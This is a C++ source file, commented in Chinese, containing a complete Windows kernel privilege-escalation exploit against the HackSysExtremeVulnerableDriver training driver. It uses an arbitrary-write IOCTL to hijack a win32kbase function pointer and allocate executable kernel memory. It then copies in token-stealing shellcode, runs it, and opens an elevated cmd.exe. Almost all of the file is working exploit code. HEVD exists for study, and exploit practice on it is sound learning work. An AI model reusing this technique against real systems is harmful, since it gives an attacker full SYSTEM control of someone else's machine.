#include <Windows.h>
#include <iostream>
#include "struct.h"

extern "C" VOID shellcode();

HANDLE hDevice = NULL;

#define WIRTE_WHAT_WHERE_IO_NUMBER  (0x0022200B)

typedef ULONG_PTR(__stdcall *NtGdiDdDDIGetContextSchedulingPriority_t)(SIZE_T, SIZE_T);

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

/*
* write_what_where_dword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_dword(UINT64 whereWriteAddress, UINT32 writeWhatValue)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	//std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	//std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	// 触发漏洞函数获取write_what_where的机会
	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
}

/*
* write_what_where_qword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_qword(UINT64 whereWriteAddress, UINT64 writeWhatValue)
{
	UINT32 lowValue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowValue);

	UINT32 highValue = writeWhatValue >> 0x20;
	write_what_where_dword(whereWriteAddress + 0x4, highValue);
}

/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}


/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

ULONG_PTR getKernelModuleAddr(PCHAR Name)
{
	// 获取NtQuerySystemIformation函数
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) 	return NULL;

	// 获取模块的信息
	DWORD len;

	// 使用NtQuerySystemInformation来获取模块长度
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!moduleInfo)	return NULL;

	// 获取模块信息
	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);

	for (int i = 0; i < moduleInfo->NumberOfModules; i++)
	{
		LPVOID kernelBase = moduleInfo->Module[i].ImageBase;
		LPVOID kernelImage = moduleInfo->Module[i].FullPathName;
		CONST USHORT OffsetToFileName = moduleInfo->Module[i].OffsetToFileName;
		
		// debug
		// std::cout << "[+] kernel base at: " << kernelBase << std::endl;
		// std::cout << "[+} kernel name is: " << (char*)kernelImage << std::endl;
		// std::cout << "[+] kernel offset is: " << OffsetToFileName << std::endl;

		char * imageName = (char*)kernelImage + OffsetToFileName;
		if (!strcmp(imageName, Name))
		{
			// debug
			// std::cout << "[+] kernel base at: " << kernelBase << std::endl;
			// std::cout << "[+} kernel name is: " << (char*)kernelImage << std::endl;
			// std::cout << "[+] kernel offset is: " << OffsetToFileName << std::endl;
			return (ULONG_PTR)kernelBase;
		}
	}
}

/*
* runShellCode:
*	[+] 运行shellcode, 替换TOKEN
*/
VOID runShellCode()
{
	NtGdiDdDDIGetContextSchedulingPriority_t NtGdiDdDDIGetContextSchedulingPriority = (NtGdiDdDDIGetContextSchedulingPriority_t)GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIGetContextSchedulingPriority");
	if (NtGdiDdDDIGetContextSchedulingPriority == NULL)
	{
		std::cout << "[+] NtGdiDdDDIGetContextSchedulingPriority failed!!! " << std::endl;
		return;
	}
	std::cout << "[+] NtGdiDdDDIGetContextSchedulingPriority at: " << NtGdiDdDDIGetContextSchedulingPriority << std::endl;
	DWORD64 addr_ntK =  (DWORD64)getKernelModuleAddr("ntoskrnl.exe");
	DWORD64 addr_wnB = (DWORD64)getKernelModuleAddr("win32kbase.sys");

	std::cout << "[+] ntK at: " << std::hex << addr_ntK << std::endl;
	std::cout << "[+] wnB at: " << std::hex << addr_wnB << std::endl;

	// 获取基地址之后可以用write_what_where替换指针了
	// 替换函数指针

	DWORD64 gDxgAddr = addr_wnB + 0x001b5ef0 + 0x1c0;
	DWORD64 exAllocAddr = addr_ntK + 0x00000000002f4410;
	std::cout << "[+] gdxg Addr is: " << std::hex << gDxgAddr << std::endl;
	std::cout << "[+] exAlloc addr is: " << std::hex << exAllocAddr << std::endl;
	int len = 0x48;
	write_what_where_qword(gDxgAddr, exAllocAddr);
	//__debugbreak();
	ULONG_PTR shellAddr = NtGdiDdDDIGetContextSchedulingPriority(0, 0x1000);	// 分配0x1000的可执行可读可写内存. 可以把shellcode放到这里面去
																				// 利用write_what_where把shellcode复制到分配的可执行内存中去
	for (int i = 0; i < len/8; i++)
	{
		DWORD64 where = (DWORD64)((char*)shellAddr + i * 8);
		DWORD64 what = *(PDWORD64)((char*)shellcode + i * 8);
		write_what_where_qword(where, what);
	}
	write_what_where_qword(gDxgAddr, shellAddr);
	// write_what_where继续替换函数指针
	//__debugbreak();
	NtGdiDdDDIGetContextSchedulingPriority(0, 0x1000);
	//__debugbreak();
}

int main()
{

	// 初始化write_what_where的环境
	if (initWriteWhatWhereEnvironment() == FALSE)
	{
		std::cout << "[+] Init Write What Where failed!!!" << std::endl;
		//system("pause");
		return 0;
	}

	//__debugbreak();
	runShellCode();
	popCmdToConfirm();
	//system("pause");
	return 0;
}